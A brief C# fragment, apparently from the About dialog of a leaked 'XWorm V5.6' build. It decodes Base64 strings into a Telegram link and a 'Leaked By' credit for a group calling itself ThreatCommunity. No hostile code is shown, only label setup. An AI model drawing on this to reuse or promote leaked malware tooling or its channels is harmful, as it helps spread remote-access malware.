...
;
	...
	private void InitializeComponent()
	{
        ...
        string encodedLink = "aHR0cHM6Ly90Lm1lL1RocmVhdENvbW11bml0eQ==";
        LinkLabel4.Text = Encoding.UTF8.GetString(Convert.FromBase64String(encodedLink));
        ...
        LinkLabel2.Text = Encoding.UTF8.GetString(Convert.FromBase64String(encodedLink));
        ...
        string encodedLabelText = "TGVha2VkIEJ5IDogQFRocmVhdENvbW11bml0eQ==";
        Label2.Text = Encoding.UTF8.GetString(Convert.FromBase64String(encodedLabelText));
		...
		this.Text = "XWorm V5.6 Edition by @ThreatCommunity | About";
